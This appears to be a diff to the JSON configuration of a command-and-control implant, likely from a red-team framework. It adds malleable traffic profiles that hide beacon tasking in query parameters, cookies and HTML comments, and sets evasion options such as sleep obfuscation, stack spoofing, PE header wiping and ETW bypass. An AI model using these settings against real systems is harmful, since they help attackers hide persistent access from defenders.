@@ -5,22 +5,34 @@
       "type": "HTTPS",
       "host": "127.0.0.1",
       "port": 6767,
-      "path": "/api/checkin",
+      "poll_path": "/api/poll",
+      "submit_path": "/api/checkin",
       "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-      "http_method": "GET",
       "max_consecutive_failures": 5,
       "backoff_sleep_ms": 10000,
-      "malleable_config": {
+      "poll_malleable_config": {
         "wrapper": {
           "prefix": "",
           "suffix": ""
         },
         "payload_location": {
-          "type": "body",
+          "type": "query_param",
           "param_name": "q",
           "path_prefix": "",
           "path_suffix": "",
-          "body_content_type": "text/plain"
+          "body_content_type": "text/plain",
+          "cookie_name": "beacon_id"
+        }
+      },
+      "submit_malleable_config": {
+        "wrapper": {
+          "prefix": "REQ_",
+          "suffix": ""
+        },
+        "payload_location": {
+          "type": "body",
+          "body_content_type": "text/plain",
+          "cookie_name": "beacon_id"
         }
       }
     },
@@ -28,11 +40,45 @@
       "type": "HTTP",
       "host": "127.0.0.1",
       "port": 6767,
-      "path": "/do/no/evil",
+      "poll_path": "/do/no/evil/poll",
+      "submit_path": "/do/no/evil",
       "user_agent": "donoevil",
-      "http_method": "POST",
       "max_consecutive_failures": 5,
-      "backoff_sleep_ms": 10000
+      "backoff_sleep_ms": 10000,
+      "poll_malleable_config": {
+        "wrapper": {
+          "prefix": "",
+          "suffix": ""
+        },
+        "payload_location": {
+          "type": "query_param",
+          "param_name": "q"
+        }
+      },
+      "submit_malleable_config": {
+        "wrapper": {
+          "prefix": "",
+          "suffix": ""
+        },
+        "payload_location": {
+          "type": "body"
+        }
+      },
+      "poll_response_malleable_config": {
+        "wrapper": {
+          "prefix": "<!--\n  tasking follows\n  -->\n",
+          "suffix": "\n<!-- end -->"
+        },
+        "headers": {
+          "X-Response-ID": "${RAND_B64:16}"
+        },
+        "body_template": "{{PAYLOAD}}",
+        "status_code": 200,
+        "payload_location": {
+          "type": "body",
+          "cookie_name": "tasking"
+        }
+      }
     }
   ],
   "sleep_ms": 5000,
@@ -45,7 +91,62 @@
   "pad": true,
   "pad_max": 1024,
   "max_response_size": 67108864,
-  "sleep_obfuscation": "ekko",
+  "poll_malleable_config": {
+    "wrapper": {
+      "prefix": "REQ_${RAND_B64:4}_",
+      "suffix": "_${JUNK:8}"
+    },
+    "http_headers": [
+      {
+        "name": "X-Request-ID",
+        "value": "${RAND_B64:16}"
+      }
+    ],
+    "payload_location": {
+      "type": "query_param",
+      "param_name": "q",
+      "path_prefix": "",
+      "path_suffix": "",
+      "body_content_type": "text/plain",
+      "cookie_name": "beacon_id"
+    }
+  },
+  "submit_malleable_config": {
+    "wrapper": {
+      "prefix": "REQ_",
+      "suffix": ""
+    },
+    "payload_location": {
+      "type": "body",
+      "body_content_type": "text/plain",
+      "cookie_name": "beacon_id"
+    }
+  },
+  "poll_response_malleable_config": {
+    "wrapper": {
+      "prefix": "<html><body><!-- ",
+      "suffix": " --></body></html>"
+    },
+    "headers": {
+      "Content-Type": "text/html"
+    },
+    "status_code": 200,
+    "payload_location": {
+      "type": "body",
+      "cookie_name": "session"
+    }
+  },
+  "submit_response_malleable_config": {
+    "wrapper": {
+      "prefix": "",
+      "suffix": ""
+    },
+    "status_code": 200,
+    "payload_location": {
+      "type": "body"
+    }
+  },
+  "sleep_obfuscation": "morpheus",
   "sleep_wipe_pe_headers": true,
   "sleep_stack_spoof": true,
   "num_spoof_frames": 6,
@@ -73,25 +174,6 @@
     "debug_mode": false,
     "bypass_etw": true,
     "validate_ssl": true
-  },
-  "malleable_config": {
-    "wrapper": {
-      "prefix": "REQ_${RAND_B64:4}_",
-      "suffix": "_${JUNK:8}"
-    },
-    "http_headers": [
-      {
-        "name": "X-Request-ID",
-        "value": "${RAND_B64:16}"
-      }
-    ],
-    "payload_location": {
-      "type": "body",
-      "body_content_type": "text/plain",
-      "param_name": "",
-      "path_prefix": "",
-      "path_suffix": ""
-    }
   },
   "work_hours": {
     "enabled": false,
